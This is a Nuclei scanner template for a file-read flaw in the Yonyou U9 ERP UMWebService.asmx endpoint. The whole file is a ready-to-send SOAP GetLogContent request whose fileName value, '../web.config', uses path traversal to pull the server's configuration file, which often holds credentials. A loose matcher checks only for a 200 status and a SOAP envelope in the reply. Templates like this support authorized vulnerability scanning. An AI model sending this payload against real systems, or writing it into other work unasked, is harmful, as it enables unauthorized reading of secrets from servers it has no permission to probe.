nuclei/用友-u9-umwebservice-文件读取.yaml

id: yongyou-u9-UMWebService-read

info:
  name: yongyou-u9-UMWebService-read
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /u9/OnLine/UMWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 371
        SOAPAction: "http://tempuri.org/GetLogContent"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLogContent xmlns="http://tempuri.org/">
              <fileName>../web.config</fileName>
            </GetLogContent>
          </soap:Body>
        </soap:Envelope>
                
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"soap:Envelope")'

